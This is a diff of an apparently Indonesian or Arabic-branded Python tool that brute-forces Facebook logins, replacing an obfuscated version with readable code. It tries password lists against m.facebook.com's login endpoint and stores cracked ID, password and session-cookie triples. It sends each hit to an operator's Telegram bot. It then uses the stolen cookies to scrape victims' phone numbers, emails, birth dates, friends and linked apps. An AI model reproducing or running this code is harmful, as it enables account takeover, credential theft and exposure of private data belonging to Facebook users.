+	rc = random.choice
+	amr = rc(['😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '😚', '😙','😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', '😏', '😒', '🙄', '😬','🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', '🤯', '🤠','🥳', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭','😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾','🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '❤️', '🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '❣️', '💕','💞', '💓', '💗', '💖', '💘', '💝', '💟', '❤️‍🔥', '❤️‍🩹', '❤️','🚀', '🛸', '🌍', '🌎', '🌏','💔','✈️','🦦','🔥','👌🏼','👋🏼','🌚','🔞','🙆‍♂️','🤦‍♂️','✨','🗿','👍🏼','🚬'])
+	sys.stdout.write(f"\r{bo}({amr}🔱 نمــࢪود 🔱𖤤) {loop}•{len(id)}  • OK:{ok} •  CP:{cp} • ({'{:.0%}'.format(loop/float(len(id)))}{amr})"),
+	sys.stdout.flush()
+	ua = random.choice(ugen)
+	ua2 = random.choice(ugen2)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			tix = time.time()
+			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
+			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				if 'ya' in oprek:
+					akun.append(idf+'|'+pw)
+					ceker(idf,pw)
+				else:
+					print('\n')
+					statuscp = f'''
+					▄︻デ══━一 «𝗖𝗣❌  سڪيوࢪ ࿐» ⏎
 ❰▭▬▭▬▭▬﹝𝐂𝐏﹞▭▬▭▬▭▬❱
- (𝑆𝐷𝑀) જ⁀➴  - 𝐈𝐃 𖡲 : {IllIlIlIIIlllIIll}
+ (𝑆𝐷𝑀) જ⁀➴  - 𝐈𝐃 𖡲 : {idf}\n
 
-
-(𝑆𝐷𝑀) જ⁀➴  - 𝗣𝗔𝗦𝗦 𖡲 :{IIlIlllIlIIlIIlIl}
+(𝑆𝐷𝑀) જ⁀➴  - 𝗣𝗔𝗦𝗦 𖡲 :{pw}
 ❰▭▬▭▬▭▬﹝𝐂𝐏﹞▭▬▭▬▭▬❱
 (🏴༒🔱 نمــࢪود 🔱༒)  𖣬 :『@M_T_F  』⏎
-\t\t\t\t\t""";IlllIIllIIllIIIlI =nel (IIIIlllIllllllIIl ,style ='red');cetak (nel (IlllIIllIIllIIIlI ,title ='SESI'));open ('CP/'+IllllIIllllIlIlll ,_IIllIlllIIIIIlIlI ).write (IllIlIlIIIlllIIll +_IIIIIIIlIIIlIIlIl +IIlIlllIlIIlIIlIl +_IlIlIllllIIlIIllI );IIllIIlllIIIIIlll .append (IllIlIlIIIlllIIll +_IIIIIIIlIIIlIIlIl +IIlIlllIlIIlIIlIl );IIlIIIIIIIIIlIIIl +=1 ;requests .get (_IlIIIIlIIllIlIllI +str (IIllllllIlllIIlII )+_IlIlIllIllIIIIlII +str (IlIIlIIllIlIllIll )+_IIIlIIIlllIIlIIII +str (IIIIlllIllllllIIl ))
-				break 
-			elif 'c_user'in IIllIIllllIllllII .cookies .get_dict ().keys ():
-				IIIllllIIlIllllIl ={_IIIllllIlIlIIlIlI :'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'}
-				if 'no'in IlIIlIlllIIIIllIl :IIIlllIIlIIIlllll +=1 ;IIlIlIIlIlllllIll =IlIllllIIlllIIlll .cookies .get_dict ();IIllIlllIIIlIlIIl =';'.join ([IlIIlllIIIIllllIl %(IllIllIlIIIllIIIl ,IIIIlllIlIIIIIlII )for (IllIllIlIIIllIIIl ,IIIIlllIlIIIIIlII )in IIllIIllllIllllII .cookies .get_dict ().items ()]);open (IlIlIlllIlllIlllI +IIIllIlIlIlIIlIlI ,_IIllIlllIIIIIlIlI ).write (IllIlIlIIIlllIIll +_IIIIIIIlIIIlIIlIl +IIlIlllIlIIlIIlIl +_IIIIIIIlIIIlIIlIl +IIllIlllIIIlIlIIl +_IlIlIllllIIlIIllI );print (_IlIlIllllIIlIIllI );IlIllllIllllllIll =f"""▄︻デ══━一 «𝗢𝗞✅ شـغال
- ࿐» ⏎
-
-❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
-
- (𝑆𝐷𝑀) જ⁀➴  
-- 𝐈𝐃 𖡲 : {IllIlIlIIIlllIIll}
-
+					'''
+					statuscp1 = nel(statuscp, style='red')
+					cetak(nel(statuscp1, title='SESI'))
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					akun.append(idf+'|'+pw)
+					cp+=1
+					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				headapp={"user-agent":"NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
+				if 'no' in taplikasi:
+					ok+=1
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					print('\n')
+					statusok = f'''▄︻デ══━一 «𝗢𝗞✅ شـغال\n ࿐» ⏎
+\n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
+\n (𝑆𝐷𝑀) જ⁀➴  \n- 𝐈𝐃 𖡲 : {idf}\n
  
+\n(𝑆𝐷𝑀) જ⁀➴  \n- 𝗣𝗔𝗦𝗦 ッ \n :{pw}
 
-(𝑆𝐷𝑀) જ⁀➴  
-- 𝗣𝗔𝗦𝗦 ッ 
- :{IIlIlllIlIIlIIlIl}
+\n(𝑆𝐷𝑀) જ⁀➴ \n - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 :  ッ \n:{kuki}
+\n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
+\n(🏴༒🔱 نمــࢪود 🔱༒)  𖣬 \n:『@M_T_F 』⏎'\n\n\t\t\t\t\t
+					'''
+					statusok1 = nel(statusok, style='green')
+					cetak(nel(statusok1, title='OK'))
+					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+					cek_SDMVIP(kuki)
+					break
+				elif 'ya' in taplikasi:
+					ok+=1
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					user=idf
+					infoakun = ""
+					session = requests.Session()
+					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
+					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
+					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
+					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
+					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
+					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
+					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
+					except:nomer = ""
+					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
+					except:email=""
+					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
+					except:ttl=""
+					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
+					except:teman = ""
+					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
+					except:pengikut = ""
+					try:
+						tahun = ""
+						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
+						for nenen in cek_thn:
+							tahun += nenen+", "
+					except:pass
 
-
-(𝑆𝐷𝑀) જ⁀➴ 
- - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 :  ッ 
-:{IIllIlllIIIlIlIIl}
-
-❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
-
-(🏴༒🔱 نمــࢪود 🔱༒)  𖣬 
-:『@M_T_F 』⏎'
-
-\t\t\t\t\t
-\t\t\t\t\t""";IlIIllllIIllIIIII =nel (IlIllllIllllllIll ,style =IlllIIIIlIlIIlIIl );cetak (nel (IlIIllllIIllIIIII ,title ='OK'));requests .get (_IlIIIIlIIllIlIllI +str (IIllllllIlllIIlII )+_IlIlIllIllIIIIlII +str (IlIIlIIllIlIllIll )+_IIIlIIIlllIIlIIII +str (IlIllllIllllllIll ));IllIlIlIIIIlllllI (IIllIlllIIIlIlIIl );break 
-				elif 'ya'in IlIIlIlllIIIIllIl :
-					IIIlllIIlIIIlllll +=1 ;IIlIlIIlIlllllIll =IlIllllIIlllIIlll .cookies .get_dict ();IIllIlllIIIlIlIIl =';'.join ([IlIIlllIIIIllllIl %(IIIIIIIllIIllIlIl ,IlIIlIlIlllIIIIlI )for (IIIIIIIllIIllIlIl ,IlIIlIlIlllIIIIlI )in IIllIIllllIllllII .cookies .get_dict ().items ()]);open (IlIlIlllIlllIlllI +IIIllIlIlIlIIlIlI ,_IIllIlllIIIIIlIlI ).write (IllIlIlIIIlllIIll +_IIIIIIIlIIIlIIlIl +IIlIlllIlIIlIIlIl +_IIIIIIIlIIIlIIlIl +IIllIlllIIIlIlIIl +_IlIlIllllIIlIIllI );IlllIllIlllIIIIII =IllIlIlIIIlllIIll ;IIIlIllIIIIIIIIlI ='';IIIllIIIIIIIllIIl =requests .Session ();IlIllIIIIllIIIlII =IIIllIIIIIIIllIIl .get ('https://m.facebook.com/profile.php',cookies =IIlIlIIlIlllllIll ,headers =IIIllllIIlIllllIl ).text ;IIllIIlIIIIlIIIlI =re .findall (IIIIlllllllIIllIl ,str (IlIllIIIIllIIIlII ))[0 ];IlllIIllllIIIlIIl =IIIllIIIIIIIllIIl .get ('https://m.facebook.com/profile.php?v=info',cookies =IIlIlIIlIlllllIll ,headers =IIIllllIIlIllllIl ).text ;IlIlIlllllIlllIIl =IIIllIIIIIIIllIIl .get ('https://m.facebook.com/profile.php?v=friends',cookies =IIlIlIIlIlllllIll ,headers =IIIllllIIlIllllIl ).text ;IIIIIIIllIlIIIIIl =IIIllIIIIIIIllIIl .get (f"https://m.facebook.com/{IlllIllIlllIIIIII}/allactivity/?category_key=all&section_id=year_2022&timestart=16l9488lll&timeend=1641l23999&sectionLoadingID=m_timeline_loading_div_1641l23999_16l9488lll_8_",cookies =IIlIlIIlIlllllIll ,headers =IIIllllIIlIllllIl ).text ;IllIIIlllIIIIllll =IIIllIIIIIIIllIIl .get (f"https://m.facebook.com/timeline/app_collection/?collection_token={IlllIllIlllIIIIII}%3A184985l71538ll2%3A32&_rdc=1&_rdr",cookies =IIlIlIIlIlllllIll ,headers =IIIllllIIlIllllIl ).text 
-					try :IIlIIlllIIIlIllII =re .findall ('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>',str (IlllIIllllIIIlIIl ))[0 ]
-					except :IIlIIlllIIIlIllII =''
-					try :IIllIllIIllIlIIII =re .findall ('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>',str (IlllIIllllIIIlIIl ))[0 ].replace ('&#064;','@')
-					except :IIllIllIIllIlIIII =''
-					try :IlllIlIIIllIlllIl =re .findall ('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>',str (IlllIIllllIIIlIIl ))[0 ]
-					except :IlllIlIIIllIlllIl =''
-					try :IllllIlIIllIlllll =re .findall ('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>',str (IlIlIlllllIlllIIl ))[0 ]
-					except :IllllIlIIllIlllll =''
-					try :IIIllllIllllllIII =re .findall ('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>',str (IllIIIlllIIIIllll ))[1 ]
-					except :IIIllllIllllllIII =''
-					try :
-						IlllIIIIlIlIlllIl ='';IIIIlIIIIIlIIlIIl =re .findall ('\\<div\\ class\\=".*?" id\\="year_(.*?)">',str (IIIIIIIllIlIIIIIl ))
-						for IllllllIIIIllllIl in IIIIlIIIIIlIIlIIl :IlllIIIIlIlIlllIl +=IllllllIIIIllllIl +', '
-					except :pass 
-					IIIlIllIIIIIIIIlI +=f"""
-▄︻デ══━一 «𝗢𝗞✅ شـغال
- ࿐» ⏎
-
-❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
-
- (𝑆𝐷𝑀) જ⁀➴  
-- 𝐈𝐃 𖡲 : {IllIlIlIIIlllIIll}
-
+					infoakun += f'''\n▄︻デ══━一 «𝗢𝗞✅ شـغال\n ࿐» ⏎
+\n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
+\n (𝑆𝐷𝑀) જ⁀➴  \n- 𝐈𝐃 𖡲 : {idf}\n
  
+\n(𝑆𝐷𝑀) જ⁀➴  \n- 𝗣𝗔𝗦𝗦 ッ \n :{pw}
 
-(𝑆𝐷𝑀) જ⁀➴  
-- 𝗣𝗔𝗦𝗦 ッ 
- :{IIlIlllIlIIlIIlIl}
+\n(𝑆𝐷𝑀) જ⁀➴ \n - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 :  ッ \n:{kuki}
+\n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
+\n(🏴༒🔱 نمــࢪود 🔱༒)  𖣬 \n:『@M_T_F 』⏎'''
+					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
 
-
-(𝑆𝐷𝑀) જ⁀➴ 
- - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 :  ッ 
-:{IIllIlllIIIlIlIIl}
-
-❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
-
-(🏴༒🔱 نمــࢪود 🔱༒)  𖣬 
-:『@M_T_F 』⏎""";requests .get (_IlIIIIlIIllIlIllI +str (IIllllllIlllIIlII )+_IlIlIllIllIIIIlII +str (IlIIlIIllIlIllIll )+_IIIlIIIlllIIlIIII +str (IIIlIllIIIIIIIIlI ));IllIIIIlllIIlllll ,IlllllIIIIllllIIl =0 ,0 ;IllllIIIIIIIlIlII =IIIllIIIIIIIllIIl .get ('https://m.facebook.com/settings/apps/tabbed/?tab=active',cookies =IIlIlIIlIlllllIll ,headers =IIIllllIIlIllllIl ).text ;IlIllIllIlIlIIlIl =IIIllIIIIIIIllIIl .get ('https://m.facebook.com/settings/apps/tabbed/?tab=inactive',cookies =IIlIlIIlIlllllIll ,headers =IIIllllIIlIllllIl ).text 
-					if 'Diakses menggunakan Facebook'in re .findall (IIIIlllllllIIllIl ,str (IllllIIIIIIIlIlII )):
-						IIIlIllIIIIIIIIlI +=f"Aplikasi Yang Terkait*\n"
-						if 'Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.'in IllllIIIIIIIlIlII :IIIlIllIIIIIIIIlI +=f"Tidak Ada Aplikasi Aktif Yang Terkait *\n"
-						else :
-							IIIlIllIIIIIIIIlI +=f"\tAplikasi Aktif : \n";IIllIIlIIllIIIIIl =re .findall (IIIlIlIIIIIIllIlI ,str (IllllIIIIIIIlIlII ));IllIIllllllllIlIl =re .findall (IIlIlIIIIlllIllII ,str (IllllIIIIIIIlIlII ))
-							for IIIIIIllIIIIlIlII in IIllIIlIIllIIIIIl :IllIIIIlllIIlllll +=1 ;IIIlIllIIIIIIIIlI +=f"\t\t[{IllIIIIlllIIlllll}] {IIIIIIllIIIIlIlII} {IllIIllllllllIlIl[IlllllIIIIllllIIl]}\n";IlllllIIIIllllIIl +=1 
-						if 'Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau'in IlIllIllIlIlIIlIl :IIIlIllIIIIIIIIlI +=f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n"
-						else :
-							IllIIIIlllIIlllll ,IlllllIIIIllllIIl =0 ,0 ;IIIlIllIIIIIIIIlI +=f"\tAplikasi Kedaluwarsa :\n";IlIIIIIlIlIlIllll =re .findall (IIIlIlIIIIIIllIlI ,str (IlIllIllIlIlIIlIl ));IIllIlIlIIllllIIl =re .findall (IIlIlIIIIlllIllII ,str (IlIllIllIlIlIIlIl ))
-							for IIIIIIllIIIIlIlII in IlIIIIIlIlIlIllll :IllIIIIlllIIlllll +=1 ;IIIlIllIIIIIIIIlI +=f"\t\t[{IllIIIIlllIIlllll}] {IIIIIIllIIIIlIlII} {IIllIlIlIIllllIIl[IlllllIIIIllllIIl]}\n";IlllllIIIIllllIIl +=1 
-					else :0 
-					print (_IlIlIllllIIlIIllI );IlIllllIllllllIll =f"""▄︻デ══━一 «𝗢𝗞✅ شـغال
- ࿐» ⏎
-
-❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
-
- (𝑆𝐷𝑀) જ⁀➴  
-- 𝐈𝐃 𖡲 : {IllIlIlIIIlllIIll}
-
+					hit1, hit2 = 0,0
+					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
+					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
+					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
+						infoakun += (f"Aplikasi Yang Terkait*\n")
+						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
+							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
+						else:
+							infoakun += (f"	Aplikasi Aktif : \n")
+							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
+							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
+							for muncul in apkAktif:
+								hit1+=1
+								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
+								hit2+=1
+						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
+							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
+						else:
+							hit1,hit2=0,0
+							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
+							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
+							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
+							for muncul in apkKadaluarsa:
+								hit1+=1
+								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
+								hit2+=1
+					else:pass
+					print('\n')
+					statusok = f'''▄︻デ══━一 «𝗢𝗞✅ شـغال\n ࿐» ⏎
+\n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
+\n (𝑆𝐷𝑀) જ⁀➴  \n- 𝐈𝐃 𖡲 : {idf}\n
  
+\n(𝑆𝐷𝑀) જ⁀➴  \n- 𝗣𝗔𝗦𝗦 ッ \n :{pw}
 
-(𝑆𝐷𝑀) જ⁀➴  
-- 𝗣𝗔𝗦𝗦 ッ 
- :{IIlIlllIlIIlIIlIl}
+\n(𝑆𝐷𝑀) જ⁀➴ \n - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 :  ッ \n:{kuki}
+\n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
+\n(🏴༒🔱 نمــࢪود 🔱༒)  𖣬 \n:『@M_T_F 』⏎'''
+					statusok1 = nel(statusok, style='green')
+					cetak(nel(statusok1, title='OK'))
+					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+					cek_SDMVIP(kuki)
+					break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
 
-
-(𝑆𝐷𝑀) જ⁀➴ 
- - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 :  ッ 
-:{IIllIlllIIIlIlIIl}
-
-❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
-
-(🏴༒🔱 نمــࢪود 🔱༒)  𖣬 
-:『@M_T_F 』⏎""";IlIIllllIIllIIIII =nel (IlIllllIllllllIll ,style =IlllIIIIlIlIIlIIl );cetak (nel (IlIIllllIIllIIIII ,title ='OK'));requests .get (_IlIIIIlIIllIlIllI +str (IIllllllIlllIIlII )+_IlIlIllIllIIIIlII +str (IlIIlIIllIlIllIll )+_IIIlIIIlllIIlIIII +str (IlIllllIllllllIll ));IllIlIlIIIIlllllI (IIllIlllIIIlIlIIl );break 
-			else :continue 
-		except requests .exceptions .ConnectionError :time .sleep (31 )
-	IlIIlIIIlIIlIlllI +=1 
-def IllIlIlIIIIlllllI (IlIIllIlllllllIlI ):
-	IIIIIIIlIIIlIllll ='noscript=1;';IIlllIllIlIIlIllI ='cookie';IIllIlIllIlIIllII =requests .Session ();IIlIlIIlIlIIlIIlI =IIllIlIllIlIIllII .get ('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active',cookies ={IIlllIllIlIIlIllI :IIIIIIIlIIIlIllll +IlIIllIlllllllIlI }).text ;IllllIlIlIIIIIIll =bs4 .BeautifulSoup (IIlIlIIlIlIIlIIlI ,_IllIIIllIlIllllII );IIlIIllllIlIlllIl =IllllIlIlIIIIIIll .find (_IIIIllIIllIllIIIl ,method =_IIIlIIlllIlIIIIll );IlIIIIllllIIllIII =[IlIIlIIIIlIllIIll .text for IlIIlIIIIlIllIIll in IIlIIllllIlIlllIl .find_all ('h3')]
-	try :
-		for IIllllIIlIlllIIII in range (len (IlIIIIllllIIllIII )):print ('\r%s  \x1b[0m              ➛ %s%s'%(IlIlIIIIIlllllIIl ,IIIIlIIllIIllIIlI ,IlIIIIllllIIllIII [IIllllIIlIlllIIII ].replace ('Ditambahkan pada',' Ditambahkan pada')))
-	except AttributeError :print ('\r    %s\x1b[0m cookie invalid'%IIIlIlIIlIlIlIllI )
-	IIlIlIIlIlIIlIIlI =IIllIlIllIlIIllII .get ('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive',cookies ={IIlllIllIlIIlIllI :IIIIIIIlIIIlIllll +IlIIllIlllllllIlI }).text ;IllllIlIlIIIIIIll =bs4 .BeautifulSoup (IIlIlIIlIlIIlIIlI ,_IllIIIllIlIllllII );IIlIIllllIlIlllIl =IllllIlIlIIIIIIll .find (_IIIIllIIllIllIIIl ,method =_IIIlIIlllIlIIIIll );IlIIIIllllIIllIII =[IllllIIIlIIIlIIlI .text for IllllIIIlIIIlIIlI in IIlIIllllIlIlllIl .find_all ('h3')]
-	try :
-		for IIllllIIlIlllIIII in range (len (IlIIIIllllIIllIII )):print ('\r%s  \x1b[0m              ➛ %s'%(IlIlIIIIIlllllIIl ,IlIIIIllllIIllIII [IIllllIIlIlllIIII ].replace ('Kedaluwarsa',' Kedaluwarsa')))
-	except AttributeError :print ('\r    %s \x1b[0mcookie invalid'%IIIlIlIIlIlIlIllI )
-if __name__ =='__main__':
-	try :os .system ('git pull')
-	except :pass 
-	try :os .mkdir ('OK')
-	except :pass 
-	try :os .mkdir ('CP')
-	except :pass 
-	try :os .mkdir ('/sdcard/SDM')
-	except :pass 
-	try :os .system ('touch .prox.txt')
-	except :pass 
-	try :os .system ('pkg install play-audio')
-	except :pass 
-	try :os .system (_IlIIlllIIlIIllIlI )
-	except :pass 
-	IIlIlIlIlIIllIlII ()
+def cek_SDMVIP(kuki):
+	session = requests.Session()
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+	except AttributeError:
+		print ("\r    %s\033[0m cookie invalid"%(M))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
+	except AttributeError:	 
+		print ("\r    %s \033[0mcookie invalid"%(M))
+if __name__=='__main__':
+	try:os.system('git pull')
+	except:pass
+	try:os.mkdir('OK')
+	except:pass
+	try:os.mkdir('CP')
+	except:pass
+	try:os.mkdir('/sdcard/SDM')
+	except:pass
+	try:os.system('touch .prox.txt')
+	except:pass
+	try:os.system('pkg install play-audio')
+	except:pass
+	try:os.system('clear')
+	except:pass
+	
+	SDM()
